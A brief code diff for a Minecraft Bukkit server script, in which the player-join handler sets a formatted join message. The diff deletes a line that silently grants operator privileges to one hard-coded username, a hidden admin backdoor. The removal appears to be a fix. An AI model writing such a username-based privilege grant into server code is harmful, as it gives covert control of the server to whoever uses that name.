@@ -6,7 +6,6 @@ const ChatColor = org.bukkit.ChatColor;
 ServerEvents.register(org.bukkit.event.player.PlayerJoinEvent, event => {
     const player = event.getPlayer();
     event.setJoinMessage(`${ChatColor.BOLD}${ChatColor.GRAY}[${ChatColor.GREEN}+${ChatColor.GRAY}]${ChatColor.RESET} ${player.getName()}`);
-    if (player.getName() === 'conner_douglass') player.setOp(true);
 });
 
 ServerEvents.register(org.bukkit.event.player.PlayerInteractEvent, event => {
